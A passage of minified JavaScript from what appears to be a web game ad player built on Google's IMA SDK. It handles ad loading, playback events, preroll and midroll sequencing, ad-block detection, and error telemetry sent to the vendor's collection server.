                    a.R[b].every(function(e, g) {
                        d = e.code;
                        !1 !== c && (a.R[b].splice(g, 1), a.R.size[b] = Object.keys(a.R[b]).length)
                    });
                    return d
                }
                return !1
            },
            mb: function(b) {
                if (a.R[b] && 0 < Object.keys(a.R[b]).length) return !0;
                a.Na = null;
                a.Yj = !1;
                a.Fa(!0);
                "preroll" === b && (a.La = !0);
                a.j(2, b);
                return !1
            },
            Ld: function() {
                a.za && a.za.destroy();
                a.za = new google.ima.AdDisplayContainer(a.u())
            },
            ze: function() {
                a.Z && a.Z.destroy();
                a.Z = new google.ima.AdsLoader(a.za);
                a.Z.getSettings().setVpaidMode(a.vpaidMode);
                a.Z.getSettings().setAutoPlayAdBreaks(!0);
                var b = setInterval(function() {
                    try {
                        var c = a.u().getElementsByTagName("iframe")[0]; - 1 < c.src.indexOf("imasdk.googleapis.com") && (c.setAttribute("Title", "Google IMA"), clearInterval(b))
                    } catch (d) {
                        clearInterval(b)
                    }
                }, 10);
                a.Z.addEventListener(google.ima.AdsManagerLoadedEvent.Type.ADS_MANAGER_LOADED, a.Wj, !1);
                a.Z.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, a.qa, !1)
            },
            Wj: function(b) {
                a.Cb();
                var c = new google.ima.AdsRenderingSettings;
                c.jh = !0;
                c.pi = !0;
                c.Oh = -1;
                a.B = b.getAdsManager(c);
                a.De() && (a.B.setVolume(0), a.X && a.X.ha && a.X.qb());
                b = [google.ima.AdEvent.Type.AD_METADATA, google.ima.AdEvent.Type.ALL_ADS_COMPLETED, google.ima.AdEvent.Type.CLICK, google.ima.AdEvent.Type.COMPLETE, google.ima.AdEvent.Type.DURATION_CHANGE, google.ima.AdEvent.Type.FIRST_QUARTILE, google.ima.AdEvent.Type.IMPRESSION, google.ima.AdEvent.Type.INTERACTION, google.ima.AdEvent.Type.LINEAR_CHANGED, google.ima.AdEvent.Type.LOADED, google.ima.AdEvent.Type.LOG, google.ima.AdEvent.Type.MIDPOINT, google.ima.AdEvent.Type.PAUSED, google.ima.AdEvent.Type.RESUMED, google.ima.AdEvent.Type.SKIPPABLE_STATE_CHANGED, google.ima.AdEvent.Type.SKIPPED, google.ima.AdEvent.Type.STARTED, google.ima.AdEvent.Type.THIRD_QUARTILE, google.ima.AdEvent.Type.USER_CLOSE, google.ima.AdEvent.Type.VOLUME_CHANGED, google.ima.AdEvent.Type.VOLUME_MUTED];
                for (var d in google.ima.AdEvent.Type) b.push(google.ima.AdEvent.Type[d]);
                d = a.df(b);
                for (var e in d) a.B.addEventListener(d[e], a.Ha);
                a.B.addEventListener(google.ima.AdEvent.Type.ALL_ADS_COMPLETED, a.Ha);
                a.B.addEventListener(google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED, a.rb);
                a.B.addEventListener(google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED, a.sb);
                a.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, a.qa, !1);
                try {
                    a.wd() ? (a.B.init(a.ka.w, a.ka.h, google.ima.ViewMode.NORMAL), a.Ga() && console.log("resizeam0", a.ka.w, a.ka.h)) : a.B.init(a.u().getBoundingClientRect().width, a.u().getBoundingClientRect().height, google.ima.ViewMode.NORMAL), a.Pa = !0
                } catch (g) {
                    a.gk()
                }
            },
            df: function(b) {
                if ("object" !== typeof b) return [];
                var c = [],
                    d;
                for (d in b) - 1 === c.indexOf(b[d]) && c.push(b[d]);
                return c
            },
            oh: function() {
                return a.Ta
            },
            Vd: function() {
                a.B && "undefined" !== typeof google && "undefined" !== typeof google.ima && (a.wd() ? 0 < a.ka.w && 0 < a.ka.h && (a.B.resize(a.ka.w, a.ka.h, google.ima.ViewMode.NORMAL), a.Ga() && console.log("resizeam1", a.ka.w, a.ka.h)) : (a.B.resize(a.u().getBoundingClientRect().width, a.u().getBoundingClientRect().height, google.ima.ViewMode.NORMAL), a.Ga() && console.log("resizeam2", a.u().getBoundingClientRect().width, a.u().getBoundingClientRect().height)), a.ea.currentAd && a.ea.currentAd[a.oh()] && (a.ea.currentAd[a.oh()].AdContainerOnResize = {
                    AC: a.u().getBoundingClientRect(),
                    CC: a.G().getBoundingClientRect()
                }))
            },
            currentAd: null,
            Fg: !1,
            get Ka() {
                return a.Fg
            },
            set Ka(b) {
                a.Fg = b
            },
            rc: -1,
            Ta: -1,
            Ha: function(b) {
                a.j(3, b.type);
                clearInterval(a.Nc);
                a.pf = !0;
                a.Ab = !0;
                if (b.type === google.ima.AdEvent.Type.LOADED) {
                    a.Nd() || a.Ch();
                    a.X && a.X.elements && a.X.elements.lc && a.X.elements.lc.classList.remove("removed");
                    a.wa && a.wa.elements && a.wa.elements.$e && a.wa.elements.$e.classList.add("removed");
                    !0 === a.options.prefetchPreroll && a.Ac(a.O ? "midroll" : "preroll");
                    a.u().classList.remove("img");
                    a.u().classList.remove("skp");
                    a.Ce = !1;
                    a.ie = !1;
                    a.O && !0 !== a.Qa.prefetchMidroll && a.sc();
                    a.O || !0 === a.Qa.prefetchPreroll || a.sc();
                    a.Cb();
                    a.currentAd = b.getAd();
                    a.ke(!0);
                    a.Ti = a.Hf(a.currentAd);
                    if (a.Ec()) {
                        a.u().classList.add("img");
                        var c = document.createElement("img");
                        c.addEventListener("load", function() {
                            a.Ce = !0
                        });
                        c.src = a.currentAd.getMediaUrl()
                    } else a.currentAd.isSkippable() ? a.u().classList.add("skp") : a.u().classList.add("nskp");
                    a.ea.currentAd[a.Ta].adDetails = {
                        w: a.currentAd.getWidth(),
                        h: a.currentAd.getHeight(),
                        media: a.currentAd.getMediaUrl()
                    };
                    a.O && !1 === a.options.waitForClickMid && (a.ia.classList.remove("wgOffViewport"), a.ia.classList.remove("removed"));
                    !1 !== a.La || a.O ? !0 === a.O ? !0 === a.bb ? a.se() : !1 === a.ld && a.ug(a.md) : !0 === a.options.prefetchPreroll && (a.vb(), a.xd()) : !0 === a.bb ? a.bd() : !0 === a.options.forceAutoplay ? a.bd() : a.La = !0;
                    if (a.Od() || a.Nb() || a.Nd()) a.va.Oi(), a.va.Qi();
                    !0 === a.Qf && (a.Qf = !1, a.vd("wgpi_", JSON.stringify(a.xc), 1));
                    a.rc = setTimeout(function() {
                        clearTimeout(a.rc);
                        a.sd();
                        a.destroy();
                        a.Fa(!0);
                        a.tb.aa();
                        a.Pa = !1;
                        !0 === a.O ? a.kc() : a.Bc();
                        "undefined" !== typeof f.adEventCallback && window[f.adEventCallback].call(this, "error", "Ad did not start within 5 seconds after load.")
                    }.bind(this), 15E3);
                    !0 !== a.Qa.prefetchMidroll && !0 !== a.Qa.prefetchPreroll || clearTimeout(a.rc)
                }
                a.ea.currentAd[a.Ta].adEvents.push(b.type);
                "function" === typeof window[a.options.adEventCallback] && (a.Mb(a.S.adTagUrl) && b.type === google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED ? a.j(4) : window[a.options.adEventCallback].call(this, b.type, a.eb.ib, b, a.currentAd, a.Od(), a.S.adTagUrl));
                "function" === typeof window[a.options.vi] && window[a.options.vi].call(this, b.type, {
                    ib: a.eb
                });
                b.type === google.ima.AdEvent.Type.STARTED && (a.Sh(), a.ge = !0);
                b.type === google.ima.AdEvent.Type.AD_PROGRESS && b.getAdData() && -1 < b.getAdData().currentTime && (!1 === a.ge ? (a.Ka || a.B.resume(), b.getAdData() && 0 < b.getAdData().currentTime && (a.j(5), window[a.options.adEventCallback].call(this, google.ima.AdEvent.Type.STARTED, {
                    ib: a.eb
                }), a.Sh(), a.ge = !0)) : (a.j(198), window[a.options.adEventCallback].call(this, google.ima.AdEvent.Type.AD_PROGRESS, {
                    ib: a.eb
                }, b, a.currentAd, a.Od(), a.S.adTagUrl)));
                b.type === google.ima.AdEvent.Type.CLICK && (a.sc(), a.Od() && (a.B.pause(), !0 === a.Ka && (a.X && a.X.elements.resume ? a.X.zg(null) : a.va.yd())), a.isMobile(), a.Kf = !0, a.wa && a.Ec() && a.wa.aa.call(a.wa, !0), a.X && a.X.elements && a.X.elements.lc && a.X.elements.lc.classList.add("removed"), c = a.ke(), a.Ec() ? c.i.push((new Date).getTime()) : a.Nb() && !a.currentAd.isSkippable() ? c.v.push((new Date).getTime()) : a.Nb() && a.currentAd.isSkippable() ? c.vs.push((new Date).getTime()) : a.$f() && c.t.push((new Date).getTime()), a.ci("wgpcpp_1", btoa(JSON.stringify(c))));
                if (b.type === google.ima.AdEvent.Type.USER_CLOSE || b.type === google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED) try {
                    a.B.stop(), a.Pa = !1, a.Ka = !1
                } catch (d) {
                    a.j(6)
                }
                b.type === google.ima.AdEvent.Type.PAUSED && (a.va.yd(), a.Ka = !1, a.u().classList.add("wgAdPaused"));
                b.type === google.ima.AdEvent.Type.RESUMED && (a.va.Hb(), a.Ka = !0, a.u().classList.remove("wgAdPaused"));
                b.type === google.ima.AdEvent.Type.SKIPPABLE_STATE_CHANGED && a.wa && a.wa.elements && a.wa.elements.$e && a.wa.elements.$e.classList.remove("removed")
            },
            qa: function(b) {
                clearInterval(a.Nc);
                clearTimeout(a.rc);
                if (b) {
                    var c = b.getError(),
                        d = {
                            AdBlock: a.Za,
                            ErrorType: c.getType(),
                            Error: c.toString(),
                            ErrorCode: c.getErrorCode(),
                            ErrorMessage: c.getMessage(),
                            DOM: {
                                AC: a.u().getBoundingClientRect(),
                                CC: a.G().getBoundingClientRect()
                            },
                            AcClass: [].concat(w$(a.u().classList.values())).join(),
                            UA: window.navigator.userAgent,
                            Screen: (a.ka.w || 0) + " x " + (a.ka.h || 0),
                            URL: encodeURIComponent(window.location.href),
                            AdTag: encodeURIComponent(a.S.adTagUrl),
                            SlotSize: {
                                Linear: {
                                    w: a.S.linearAdSlotWidth,
                                    h: a.S.linearAdSlotHeight
                                },
                                NonLinear: {
                                    w: a.S.nonLinearAdSlotWidth,
                                    h: a.S.nonLinearAdSlotHeight
                                }
                            },
                            PrefetchPRE: !0 === a.options.prefetchPreroll,
                            V: 70
                        };
                    if (a.currentAd) {
                        var e = {
                            ContentType: a.currentAd.getContentType(),
                            AdSystem: a.currentAd.getAdSystem(),
                            MediaURL: a.currentAd.getMediaUrl(),
                            Width: a.currentAd.getVastMediaWidth() +
                                " / " + a.currentAd.getWidth() + " / " + a.currentAd.getVastMediaWidth(),
                            Height: a.currentAd.getVastMediaHeight() + " / " + a.currentAd.getHeight() + " / " + a.currentAd.getVastMediaHeight()
                        };
                        d.Ad = Object.assign({}, e)
                    }
                    1009 !== c.getErrorCode() && (c = new XMLHttpRequest, c.open("POST", "https://collect.wgplayer.com/gic", !0), c.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), c.send("p=" + JSON.stringify(d) + "&g=afgerr"))
                }
                a.eg = !1;
                a.Pa = !1;
                a.pf = !0;
                a.Ab = !0;
                a.ie = !1;
                if (b) {
                    if (d = b.getError()) {
                        a.j(86);
                        a.j(87, d.toString());
                        a.j(88, d.getErrorCode());
                        a.j(89, d.getInnerError());
                        a.j(90, d.getVastErrorCode());
                        a.j(91, d.getType());
                        a.j(92, d.getMessage());
                        1012 === d.getErrorCode() && (a.j(93), a.destroy(), a.Sb());
                        a.Cb();
                        clearInterval(a.Nc);
                        null === a.Na && a.Sb();
                        if ("1012" === d.getErrorCode().toString()) return a.Za = !0, a.ea.adBlock = !0, b = new a.adBlock, a.zb = b, b.init(), a.tb.aa(), !1;
                        a.currentAd && (a.j(94), a.j(95, a.currentAd.getAdSystem()), a.j(96, a.currentAd.getContentType()), a.j(97, a.currentAd.getMediaUrl()), a.j(98, a.currentAd.getVastMediaWidth(), a.currentAd.getWidth(), a.currentAd.getVastMediaWidth()), a.j(99, a.currentAd.getVastMediaHeight(), a.currentAd.getHeight(), a.currentAd.getVastMediaHeight()), a.j(100), a.B.destroy(), a.Ph(), a.Mb(a.S.adTagUrl) && (a.La = !1))
                    }
                    d.getErrorCode();
                    a.ea.currentAd[a.Ta].Error = {
                        ErrorType: d.getType(),
                        Error: d.toString(),
                        ErrorCode: d.getErrorCode(),
                        ErrorMessage: d.getMessage(),
                        DOM: {
                            AC: a.u().getBoundingClientRect(),
                            CC: a.G().getBoundingClientRect()
                        }
                    }
                }
                a.Cb();
                d = a.O ? "midroll" : "preroll";
                "undefined" !== typeof f.adEventCallback && (a.mb(d) || window[f.adEventCallback].call(this, "error", b.getError().toString()));
                if (a.mb(d))
                    if (!0 === a.ria) a.ag(a.re(d, !1)) ? a.Le(d) : (a.currentAd = null, a.Eb(d));
                    else {
                        if (a.Pb) return a.currentAd = null, a.Eb(d), !1;
                        a.currentAd = null;
                        a.Eb(d)
                    }
                else a.O || (a.La = !0), a.sd(), a.Fa(!0), a.tb.aa(), a.xe(), !0 === a.Va.me && a.Va.Wc && setTimeout(function() {
                    a.Va.ei()
                }, a.options.app.delay || 1E3), setTimeout(function() {
                    a.destroy()
                }, 300)
            },
            Yl: function(b) {
                if (-1 < ["wk"].indexOf(b)) try {
                    var c = location.pathname;
                    "/" === c.charAt(c.length - 1) && (c = c.substr(0, c.length - 1));
                    var d = {
                            domain: a.ea.domain,
                            url: location.protocol + "//" + location.host + c,
                            ref: document.referrer ? document.referrer : a.ea.domain,
                            embedded: a.Ca(),
                            action: b,
                            type: "afg",
                            pic: a.Th || null
                        },
                        e = new XMLHttpRequest;
                    e.open("POST", "https://collect.wgplayer.com/gic", !0);
                    e.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    e.send("p=" + JSON.stringify(d) + "&g=wk")
                } catch (g) {
                    console.log(g)
                }
            },
            Zl: function(b, c) {
                try {
                    var d = new XMLHttpRequest;
                    d.open("POST", "https://collect.wgplayer.com/gic", !0);
                    d.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    d.send("p=" + JSON.stringify(b) + "&g=" + c)
                } catch (e) {
                    console.log(e)
                }
            },
            Al: function(b) {
                var c = 2E3;
                switch (b) {
                    case "video":
                        c = 3E3;
                        break;
                    case "image":
                        c = 3E3;
                        break;
                    case "text":
                        c = 3E3
                }
                return c
            },
            zh: function(b) {
                a.j(7, b.srcElement.currentTime);
                b.srcElement.currentTime > ("undefined" !== typeof a.options.ec && "undefined" !== typeof a.options.ec.v ? a.options.ec.v / 1E3 : 3) && (a.j(8), a.Rb(), b.srcElement.removeEventListener("timeupdate", a.zh), a.ce = null)
            },
            Ue: !1,
            ce: null,
            am: null,
            ge: !1,
            Sh: function() {
                a.Ac(a.O ? "midroll" : "preroll");
                a.wa && a.wa.aa.call(a.wa, !0);
                a.Kf = !1;
                a.Ph();
                a.xe();
                a.j(195);
                !a.X || a.currentAd.isSkippable() && !a.Nd() ? a.j(194) : (a.j(193), a.X.init.call(a.X), a.Nd() && a.u().setAttribute("cpp", "true"));
                try {
                    a.va.Hb()
                } catch (d) {}
                a.sc();
                a.Ka = !0;
                if (!0 === a.Zf)
                    if (a.Nb()) a.ce && "undefined" !== a.ce.src && "" !== a.ce.src.toString().trim() ? (a.j(10), a.ce.addEventListener("timeupdate", a.zh)) : (a.j(11), setTimeout(function() {
                        a.Rb()
                    }, "undefined" !== typeof a.options.ec && "undefined" !== typeof a.options.ec.v ? a.options.ec.v : 4E3));
                    else if (a.Ec())
                    if (!0 === a.Ce) setTimeout(function() {
                        a.Rb()
                    }, "undefined" !== typeof a.options.ec && "undefined" !== typeof a.options.ec.i ? a.options.ec.i : 4E3);
                    else var b = setInterval(function() {
                        !0 === a.Ce && (clearInterval(b), setTimeout(function() {
                            a.Rb()
                        }, "undefined" !== typeof a.options.ec && "undefined" !== typeof a.options.ec.i ? a.options.ec.i : 4E3))
                    }, 100);
                else a.$f() ? setTimeout(function() {
                    a.Rb()
                }, "undefined" !== typeof a.options.ec && "undefined" !== typeof a.options.ec.t ? a.options.ec.t : 4E3) : (a.j(13), setTimeout(function() {
                    a.Rb()
                }, 4E3));
                else a.Rb();
                a.O || (a.La = !0);
                a.Nb() && a.va.Ze();
                clearTimeout(a.rc);
                !0 === a.Ue && (a.ee = !1, a.tg(), a.Ue = !1);
                a.Mb(a.S.adTagUrl) && (a.Ue = !0, a.we(), setTimeout(function() {
                    a.tg()
                }, 1E3));
                "undefined" !== typeof a.rc && clearTimeout(a.rc);
                a.tb.aa();
                a.Vd();
                a.O && (a.ld = !0);
                a.pg();
                a.Fa(!1, !0);
                a.u().classList.remove("wgAdLoaded");
                a.u().classList.add("wgAdLoaded");
                !0 === a.O ? a.adCount.midroll.count++ : a.adCount.preroll.count++;
                a.Na = null;
                a.eg = !0;
                a.O || (a.kg = !0);
                a.Ga() && (console.log("Current ad:", a.currentAd), window.WgCurrentAd = a.currentAd);
                if (a.Mb(a.S.adTagUrl) && a.mb(a.O ? "midroll" : "preroll") && 0 === a.fb.length && a.Re) {
                    var c = a.re(a.O ? "midroll" : "preroll");
                    a.Re.getAd(c)
                }
                if (a.Nd()) {
                    a.rk();
                    if (c = document.querySelectorAll("[data-wgplayer] div[style*='display: block'] video")[0]) c.style.backgroundColor = "transparent";
                    if (c = document.querySelectorAll("[data-wgplayer] div[style*='display: block'] lima-video")[0]) c.style.backgroundColor = "transparent"
                }!0 === a.options.fixedBody && document.querySelectorAll("body")[0].classList.add("wgFixed")
            },
            Re: null,
            Ih: function() {
                var b = a.F("div", "spr");
                a.s("." + b.classList[0] + "{ position:absolute; top:0; left:0; z-index:2147483610; width:100%; height:100%;}");
                b.classList.add("wgHidden");
                a.u().insertBefore(b, a.u().firstChild);
                a.Re = new a.wi;
                a.Re.init(b, a.vpaidMode, !1, "", {
                    w: a.u().getBoundingClientRect().width,
                    h: a.u().getBoundingClientRect().height
                }, {
                    Ha: a.Ha,
                    qa: a.qa,
                    sb: a.sb,
                    rb: a.rb
                })
            },
            va: {
                play: null,
                pause: null,
                resume: null,
                qb: null,
                yb: null,
                qc: null,
                Oi: function() {
                    this.resume = a.F("a", "ResumeAdButton");
                    this.resume.classList.add("wgHidden");
                    this.resume.addEventListener(a.na, function() {
                        a.B && (a.B.resume(), a.va.Hb(), a.Ka = !0, a.X && a.X.elements.resume && a.X.Hb.call(a.X))
                    }, !1)
                },
                yd: function() {
                    this.resume.classList.remove("wgHidden");
                    this.resume.parentNode || (a.u().insertBefore(this.resume, a.u().firstChild), a.Zh())
                },
                Hb: function() {
                    this.resume.classList.add("wgHidden")
                },
                Qi: function() {
                    if (null !== this.qc) return !1;
                    this.qc = a.F("div", "soundButton");
                    this.qc.classList.add("wgHidden");
                    this.qc.addEventListener(a.na, function(b) {
                        b.preventDefault();
                        b.stopPropagation();
                        b.stopImmediatePropagation();
                        a.B && setTimeout(function() {
                            a.B.setVolume(1);
                            a.va.ye();
                            a.bb = !0;
                            a.X && a.X.ha && a.X.yb()
                        }, 500)
                    }, !1)
                },
                Ze: function() {
                    !this.resume.parentNode && a.currentAd && 0 === a.B.getVolume() && a.u().insertBefore(this.qc, a.u().firstChild);
                    this.qc.classList.remove("wgHidden")
                },
                ye: function() {
                    this.qc && this.qc.classList.add("wgHidden")
                }
            },
            Nb: function(b) {
                return (b = (b = void 0 === b ? null : b) ? b : a.currentAd) && (-1 < b.getContentType().indexOf("video") || -1 < b.getContentType().indexOf("javascript")) ? !0 : !1
            },
            Od: function(b) {
                var c = (b = void 0 === b ? null : b) ? b : a.currentAd;
                return c && -1 < c.getContentType().indexOf("video") || a.Nb(b) ? !0 : !1
            },
            Nd: function(b) {
                return (b = (b = void 0 === b ? null : b) ? b : a.currentAd) && -1 < b.getContentType().indexOf("audio") ? !0 : !1
            },
            Ec: function(b) {
                return (b = (b = void 0 === b ? null : b) ? b : a.currentAd) && -1 < b.getContentType().indexOf("image") ? !0 : !1
            },
            $f: function() {
                return a.currentAd && -1 < a.currentAd.getContentType().indexOf("text") ? !0 : !1
            },
            Vh: function() {
                a.currentAd = null;
                a.Ka = !1
            },
            rb: function() {
                a.Cb();
                a.Ka = !0
            },
            Ph: function() {
                a.Mb(a.S.adTagUrl) ? (a.Pb = !0, a.Mh = a.currentAd.isSkippable(), a.ak()) : a.Pb = !1
            },
            sb: function() {
                var b = a.O ? "midroll" : "preroll";
                1 < a.options.adCount ? a.adCount[b].count < a.options.adCount ? (a.j(15, a.adCount[b].count), a.O ? a.ld = !1 : a.La = !1, !0 === a.ria && 0 === a.fb.length ? a.Le(b) : (a.currentAd = null, a.Eb(b))) : a.destroy() : a.Pb ? (a.j(16), a.O ? a.ld = !1 : a.La = !1, !0 === a.eg && (a.we(), a.Dd = "Ad 2 of 2 ()", a.Ea.innerText = a.Dd), !0 === a.ria ? a.Le(b) : (a.currentAd = null, a.Eb(b))) : (a.currentAd && a.currentAd.getAdPodInfo() && 1 < a.currentAd.getAdPodInfo().getTotalAds() && (a.Z && (a.Z.contentComplete(), a.Z.destroy()), a.za && a.za.destroy()), a.destroy(), 0 < a.fb.length && (a.fb[0].Xc.parentNode.removeChild(a.fb[0].Xc), a.fb.shift()), !0 === a.Va.me && a.Va.Wc && setTimeout(function() {
                    a.Va.ei()
                }, a.options.app.delay || 1E3));
                a.Pa = !1
            },
            ak: function() {
                var b = a.O ? "midroll" : "preroll",
                    c = [],
                    d;
                for (d in a.R[b]) a.R[b].hasOwnProperty(d) && (a.Mb(a.R[b][d].code) ? a.R.size[b] = Object.keys(a.R[b]).length : c.push(a.R[b][d]));
                a.R[b] = c;
                a.R.size[b] = Object.keys(a.R[b]).length
            },
            Pb: !1,
            eg: !1,
            Mh: !1,
            bd: function() {
                0 === a.lt && a.Mc();
                a.Pb && setTimeout(function() {
                    a.tg()
                }, 1E3);
                !0 === a.bb || a.B ? a.B && a.currentAd ? a.Od() && !1 === a.bb && !0 !== a.options.forceAutoplay ? (a.xd(), a.Ac("preroll"), a.Fa(!0, !0, !0)) : (!0 === a.options.forceAutoplay && !1 === a.bb && a.B.setVolume(0), a.O ? a.kc() : a.Bc(), !0 === a.options.he && a.B.setVolume(0), a.B.start()) : 0 < a.fb.length ? a.fb[0].start() : a.requestAds("preroll") : 0 < a.fb.length ? a.fb[0].start() : !0 === a.options.preload ? a.requestAds("preroll") : !0 === a.options.prefetchPreroll ? a.requestAds("preroll") : !0 === a.options.forceAutoplay ? a.requestAds("preroll") : (a.xd(), a.Fa(!0, !0, !0))
            },
            Yf: function(b) {
                return -1 < b.indexOf("undefined" !== typeof a.options.wgAdTagIdentifier ? a.options.wgAdTagIdentifier : "iu=/1002212") && (-1 < b.indexOf("/ADX-") || -1 < b.indexOf("/WGAFG")) ? !0 : !1
            },
            ag: function(b) {
                return -1 < b.indexOf("undefined" !== typeof a.options.wgAdTagIdentifier ? a.options.wgAdTagIdentifier : "iu=/1002212") || -1 < b.indexOf("iu=/52117743") || -1 < b.indexOf("iu=/5023680") ? !0 : !1
            },
            xb: 1,
            Sc: 0,
            gj: !0,
            bl: function(b) {
                console.log(b);
                return !0
            },
            bm: function() {
                return !0
            },
            Qf: !1,
            xc: null,
            requestAds: function(b) {
                if (!0 === a.options.noAd) return a.j(17), a.Na = null, a.destroy(), !1;
                a.O ? "undefined" !== typeof a.gd[a.xb] && "" !== a.gd[a.xb] && (a.la.querySelectorAll(".wgPrerollCTA span")[0].innerHTML = a.gd[a.xb]) : "undefined" !== typeof a.gd[a.xb] && "" !== a.gd[a.xb] && (a.ja.querySelectorAll(".wgPrerollCTA span")[0].innerHTML = a.gd[a.xb]);
                a.Ab = !0;
                null === a.Na && (a.Na = !0);
                a.O = !0 === a.Kd && !0 === a.La && !0 === a.kg ? !0 : !0 !== a.Kd || !1 !== a.La || a.O ? !0 === a.Kd && !0 === a.La && !1 === a.kg && "preroll" === b ? !1 : !0 : !1;
                if (!a.mb(a.O ? "midroll" : "preroll")) return a.O || (a.La = !0), a.Na = null, a.destroy(), !1;
                if (b = JSON.parse(a.Aa("wgpas_1"))) a.$b = b;
                a.u().classList.remove("wgAdLoaded");
                b = a.re(a.O ? "midroll" : "preroll");
                a.j(18, a.R.size[a.O ? "midroll" : "preroll"]);
                a.j(19, b);
                if (a.Yf(b) && (a.j(20), !a.Md)) {
                    if (0 < a.R.size[a.O ? "midroll" : "preroll"]) {
                        if (a.mb(a.O ? "midroll" : "preroll")) {
                            a.j(21);
                            try {
                                if (a.Ca() && -1 === document.referrer.indexOf(a.wc)) {
                                    var c = {
                                            Dj: a.Ca() ? !0 : !1,
                                            domain: a.wc,
                                            url: a.Ca() ? document.referrer : window.location.href
                                        },
                                        d = new XMLHttpRequest;
                                    d.open("POST", "//w.wgplayer.xyz/stats/adstxterrors", !0);
                                    d.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                                    d.send(JSON.stringify(c))
                                }
                            } catch (e) {}
                            a.requestAds()
                        } else a.j(22), a.destroy();
                        return !1
                    }
                    a.j(23)
                }
                a.vd("wgpas_1", JSON.stringify(a.$b), .5);
                a.O || a.Mb(b) || (b = a.mk(b, "afgpos=" + a.xb));
                b = a.Tf(b);
                if (!1 === a.Tg(b)) return !1;
                a.pj();
                a.j(24, a.S.adTagUrl);
                a.Ta++;
                a.ea.currentAd[a.Ta] = {};
                a.ea.currentAd[a.Ta].Time = {
                    request: (Date.now() - a.ea.time.init) / 1E3
                };
                a.ea.currentAd[a.Ta].Error = {};
                a.ea.currentAd[a.Ta].adEvents = [];
                a.ea.currentAd[a.Ta].AdTags = {};
                a.ea.currentAd[a.Ta].AdTags = encodeURIComponent(a.S.adTagUrl);
                a.S.adTagUrl && a.j(25, Object.keys(a.R[a.O ? "midroll" : "preroll"]).length, a.S.adTagUrl.slice(0, 100));
                a.R.f[a.O ? "midroll" : "preroll"] = !0;
                a.ge = !1;
                a.gj = !1;
                if (!0 === a.noAd && "undefined" !== typeof a.options.exctpos && -1 < a.options.exctpos.indexOf(a.Sc))
                    if (a.j(26), a.Cb(), a.mb(a.O ? "midroll" : "preroll")) a.Sc = parseInt(a.Sc, 10) + 1, a.requestAds();
                    else return a.Na = null, a.destroy(), !1;
                else a.j(27, a.xb, a.S.adTagUrl), a.ie = !0, a.Sc = parseInt(a.Sc, 10) + 1, a.Z.requestAds(a.S), a.xb++
            },
            Tf: function(b, c) {
                c = void 0 === c ? null : c;
                c = a.isMobile() ? c ? c : {
                    w: a.ka.w,
                    h: a.ka.h
                } : c ? c : {
                    w: a.u().getBoundingClientRect().width,
                    h: a.u().getBoundingClientRect().height
                };
                if (a.Ui() && a.ag(b) && !0 === a.options.pd) {
                    var d = a.Aa("wgpi_");
                    a.Qf = !0;
                    if (null !== d)
                        if (d = JSON.parse(d), a.O) {
                            if (a.xc = {
                                    p: !d.p,
                                    cb: !d.cb
                                }, !0 === a.xc.cb) var e = a.Xa.info
                        } else a.xc = {
                            p: !d.p,
                            cb: !d.cb
                        }, !0 === a.xc.p && (e = a.Xa.info);
                    else a.O ? (a.xc = {
                        p: a.Xa.Lc.p,
                        cb: a.Xa.Lc.cb
                    }, !0 === a.Xa.Lc.cb && (e = a.Xa.info)) : (a.xc = {
                        p: a.Xa.Lc.p,
                        cb: a.Xa.Lc.cb
                    }, !0 === a.Xa.Lc.p && (e = a.Xa.info));
                    e ? (e = e.split("&"), b = b.replace("&impl=s", "&impl=s&" + e[1]), b = b.replace("&env=vp", "&env=vp&" + e[2]), b = b.replace("&unviewed_position_start=1", "&unviewed_position_start=1&" + e[3]), a.$b[a.O ? "midroll" : "preroll"].opd++, b = a.ga(b, "adt=opd" + a.$b[a.O ? "midroll" : "preroll"].opd, null, !1)) : (a.$b[a.O ? "midroll" : "preroll"].st++, b = a.ga(b, "adt=st" + a.$b[a.O ? "midroll" : "preroll"].st, null, !1))
                } else a.$b[a.O ? "midroll" : "preroll"].st++, b = a.ga(b, "adt=st" + a.$b[a.O ? "midroll" : "preroll"].st, null, !1);
                !0 === a.Ee && (b = a.ga(b, "mgr=true", null, !1), a.Ee = !1);
                a.Pb && (b = a.Mh ? a.ga(b, "nsv=false", null, !1) : a.ga(b, "nsv=true", null, !1));
                b = a.ga(b, "wgv=70", null, !1);
                e = b.match(/[&|\?]npa=([0-9]*)/i);
                null !== e && 0 < e.length && (b = b.replace(e[0], e[0].replace(e[1], !0 === a.npa ? 1 : 0)));
                b = 210 > c.w ? a.ga(b, "wgsize=v", null, !1) : 210 <= c.w && 470 > c.w ? a.ga(b, "wgsize=vi", null, !1) : a.ga(b, "wgsize=vit", null, !1);
                window.navigator && window.navigator.connection && window.navigator.connection.downlink ? (b = 2 <= navigator.connection.downlink ? a.ga(b, "wgspeed=venb", null, !1) : a.ga(b, "wgspeed=vdis", null, !1), a.j("Speed: " + window.navigator.connection.downlink)) : b = a.ga(b, "wgspeed=unkn", null, !1);
                return b
            },
            om: 0,
            Jd: -1,
            pj: function() {
                a.j(28);
                a.Cb();
                a.Jd = setTimeout(function() {
                    a.Cb();
                    a.j(29);
                    a.ea.currentAd[a.Ta].Error = {
                        Error: "Ad freezed",
                        DOM: {
                            AC: a.u().getBoundingClientRect(),
                            CC: a.G().getBoundingClientRect()
                        }
                    };
                    var b = a.O ? "midroll" : "preroll";
                    if (a.mb(b))
                        if (!0 === a.ria) a.ag(a.re(b, !1)) ? a.Le(b) : (a.currentAd = null, a.Eb(b));
                        else {
                            if (a.Pb) return a.currentAd = null, a.Eb(b), !1;
                            a.currentAd = null;
                            a.Eb(b)
                        }
                    else a.destroy(), a.fh(), a.Sb()
                }, 5E3)
            },
            Cb: function() {
                -1 < a.Jd && 0 < a.Jd && (a.j(30), clearTimeout(a.Jd), a.j(31, a.Jd))
            },
            Nc: -1,
            km: function() {
                clearTimeout(a.Nc);
                a.Nc = setTimeout(function() {
                    clearTimeout(a.Nc);
                    a.Cb();
                    a.sd();
                    a.destroy();
                    a.Fa(!0);
                    a.tb.aa();
                    a.Pa = !1;
                    !0 === a.O ? a.kc() : a.Bc();
